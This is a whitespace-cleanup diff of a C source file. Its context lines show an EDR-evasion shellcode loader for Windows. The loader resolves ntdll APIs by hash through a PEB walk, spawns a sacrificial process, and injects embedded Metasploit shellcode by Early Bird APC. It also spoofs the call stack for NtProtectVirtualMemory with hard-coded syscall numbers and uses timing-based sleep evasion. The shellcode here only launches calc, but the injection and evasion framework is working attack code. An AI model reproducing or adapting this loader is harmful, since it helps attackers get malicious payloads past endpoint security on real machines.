@@ -59,10 +59,10 @@ LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
 	// Getting the Size of ntdll
 	//SIZE_T ntdllsize = NT_HEADER->OptionalHeader.SizeOfImage;
 
-	// Loading loaded DllBase Address from: 
-	// 
+	// Loading loaded DllBase Address from:
+	//
 	// Method2:
-	// 
+	//
 	// Optional Header (IMAGE_OPTIONAL_HEADER64 struture) -> present in winnt.h file
 
 	/*
@@ -87,14 +87,14 @@ LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
 	//IMAGE_DATA_DIRECTORY* DataDirectory = (IMAGE_DATA_DIRECTORY*)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES].VirtualAddress);
 
 	//DWORD*	AddressOfFunctions = (DWORD*)((LPBYTE)DllBase + DataDirectory->)
-	//DWORD*	AddressOfNames = 
-	//DWORD*	AddressOfNameOrdinals = 
+	//DWORD*	AddressOfNames =
+	//DWORD*	AddressOfNameOrdinals =
 
 	PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 	PDWORD fAddr = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfFunctions);
 	PDWORD fNames = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfNames);
 	PWORD  fOrdinals = (PWORD)((LPBYTE)DllBase + EXdir->AddressOfNameOrdinals);
-	
+
 	//printf("\tfAddr: %p\n", fAddr);
 	//printf("\tfNames: %p\n", fNames);
 	//printf("\tfOrdinals: %p\n", fOrdinals);
@@ -103,9 +103,9 @@ LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
 	for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++)
 	{
 		LPSTR pFuncName = (LPSTR)((LPBYTE)DllBase + fNames[i]);
-		
+
 		//PWSTR pwFuncName = LPSTR_to_PWSTR(pFuncName);
-		
+
 		//DWORD64 hash = create_hash(pwFuncName);
 		DWORD64 hash = djb2(pFuncName);
 
@@ -134,7 +134,7 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 	// __readgsqword :
 	// It is MSVC compiler intrinsic that reads memory from GS segment at specified offset.
 
-	
+
 	// Method1:
 
 
@@ -169,7 +169,7 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 
 	// ========================== Directly via offset (from TIB) -> PEB ==============================================
 
-	
+
 	// Method2:
 
 
@@ -206,9 +206,9 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 		LdrEntry = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
 		// Loading loaded DllBase Address from:
-		// 
+		//
 		// Method1:
-		// 
+		//
 		// Loader Data Table Entry (LDR_DATA_TABLE_ENTRY struture) -> present in ntapi.h file
 
 		//UNICODE_STRING FullDllName = (UNICODE_STRING)(LdrEntry->FullDllName);
@@ -248,7 +248,7 @@ HMODULE ResolveDLL(DWORD64 passedHash)
 
 		//printf("retrievedhash: 0x%llX\n", retrievedhash);
 		//printf("BaseDllName: %ws (addr: %p)\n\n", BaseDllName.Buffer, DllBase);
-		
+
 		if (retrievedhash == passedHash)
 		{
             //if (strcmp(Dllname,"KERNELBASE.dll") == 0)
@@ -438,7 +438,7 @@ ULONG FindTextSection(HMODULE module)
     // find .text section
 	for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++)
     {
-		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
+		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
 												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));
 
 		if (!strcmp((char *) pImgSectionHead->Name, ".text"))
@@ -458,13 +458,13 @@ BOOL Local_blockdlls()
 
 	// Enable blocking of non-Microsoft signed DLLs
 	BOOL result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &Policy, sizeof(Policy));
-	
+
 	if (!result)
 	{
 		printf("Failed to set policy (%u)\n", GetLastError());
 		return FALSE;
 	}
-	
+
 	return TRUE;
 }
 
@@ -488,10 +488,10 @@ BOOL NtCreateUserProcessForthree(
     UsCommandLine = { 0 },
     UsCurrentDirectory = { 0 };
     PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters = NULL;
-    
+
     // the mitigation policy flag (attribute value): CIG + ACG
     DWORD64  Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
-    
+
     // allocating a buffer to hold the value of the attribute lists
     PPS_ATTRIBUTE_LIST              pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
     if (!pAttributeList)
@@ -512,10 +512,10 @@ BOOL NtCreateUserProcessForthree(
     printf("[+] HERE: 510\n");
 
     // calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess'
-    //PVOID spoofResult2 = Spoof(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, 
+    //PVOID spoofResult2 = Spoof(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory,
 
     STATUS = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
-    
+
     printf("[+] HERE: 517\n");
 
     if (STATUS != STATUS_SUCCESS)
@@ -565,21 +565,21 @@ BOOL NtCreateUserProcessForthree(
 
     // creating the process
     // hProcess and hThread are already pointers
-    
+
     //PVOID spoofResult2 = Spoof(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, &p, pNtCreateUserProcess, (PVOID)7, (PVOID)NULL, (PVOID)NULL, (PVOID)NULL, (PVOID)NULL, (PVOID)UppProcessParameters, (PVOID)&psCreateInfo, (PVOID)pAttributeList);
     // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
-    
+
     //STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList);
     //STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_SUSPENDED, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, UppProcessParameters, &psCreateInfo, pAttributeList);
 
-    STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, 1, UppProcessParameters, &psCreateInfo, pAttributeList);    
-    
+    STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, 1, UppProcessParameters, &psCreateInfo, pAttributeList);
+
     if (STATUS != STATUS_SUCCESS)
     {
         printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
         goto CleanUp;
     }
-    
+
 
     printf("[+] HERE: 563\n");
 
@@ -700,7 +700,7 @@ int main(int argc, char** argv)
     // Define the shellcode to be injected
     unsigned char enc_shellcode_bin[] = "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x63\x61\x6C\x63\x00";
    // unsigned char enc_shellcode_bin[] = "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
-    
+
     unsigned int shellcode_size = sizeof(enc_shellcode_bin);
 
     // SIZE_T shellcode variable for NT api operation
@@ -716,7 +716,7 @@ int main(int argc, char** argv)
 	ULONG shcSize = (ULONG)shellcode_size;
 
     // =========================== Naked Msf Calc Shellcode: ========================================
-	
+
     /* Target Spawned Remote Sacrificial Process: Early Bird APC PInjection : Thanks to reenz0h(twitter : @SEKTOR7net) */
 
 	// Intializing some important stuff
@@ -781,7 +781,7 @@ int main(int argc, char** argv)
     // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
     si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
 
-    // Initialise our list 
+    // Initialise our list
     if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize))
     {
         printf("[!] InitializeProcThreadAttributeList Failed With Error : %u \n", GetLastError());
@@ -797,7 +797,7 @@ int main(int argc, char** argv)
 
 
     // ============================================================= CIG and ACG Mitigation ===============================================================
-    
+
     // Although EDR vendors like CrowdStrike Falcon signs their Injection DLL with MS rendering CIG as useless! (https://twitter.com/Sektor7Net/status/1187818929512730626)
     // For ACG Thing: Remotes processes (i.e EDRs) could use VirtualAllocEx and WriteProcessMemory to write and execute shellcode/dll in an ACG enabled process rendering ACG useless.
     // https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy
@@ -818,7 +818,7 @@ int main(int argc, char** argv)
         printf("[!] CreateProcessA Failed With Error : %u \n", GetLastError());
         return 1;
     }
-    
+
     DWORD dwProcessId = pi.dwProcessId;
     HANDLE hProcess = pi.hProcess;
     HANDLE hThread = pi.hThread;
@@ -963,9 +963,9 @@ int main(int argc, char** argv)
 
     // NtProtectVirtualMemory: 0x858BCB1046FB6A37
     PVOID pNtProtectVirtualMemory = ResolveNtAPI(hDLL_ntdll, 0x858BCB1046FB6A37);
-    
+
     DWORD OldProtect = 0;
-    
+
     p.ssn = (PVOID)0x50;
 
     PVOID spoofResult3 = Spoof(hProcess, &BaseAddress, &shellcode_size2, PAGE_EXECUTE_READ, &p, pNtProtectVirtualMemory, (PVOID)1, &OldProtect);
@@ -1060,11 +1060,11 @@ int main(int argc, char** argv)
 
 
     pattern();
-    
+
     // ================================= END: NtResumeThread ==========================================
 
     HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, si.lpAttributeList);
-    
+
     printf("[+] DONE \n\n");
 
     CloseHandle(hProcess);
@@ -1073,7 +1073,7 @@ int main(int argc, char** argv)
     pattern();
 
     //printf("[+] Called Sleep\n");
-    
+
     //Spoof((PVOID)INFINITE, NULL, NULL, NULL, &p, Sleep, (PVOID)0);
 
     printf("[+] Calling NtDelayExecution\n\n");
@@ -1086,7 +1086,7 @@ int main(int argc, char** argv)
     DWORD ms = 100;
     //DWORD ms = 10000;
     //DWORD ms = 100000;
-    
+
     // Code: https://evasions.checkpoint.com/techniques/timing.html
     GetSystemTimeAsFileTime((LPFILETIME)&SleepUntil);
     SleepUntil.QuadPart += (ms * 10000);
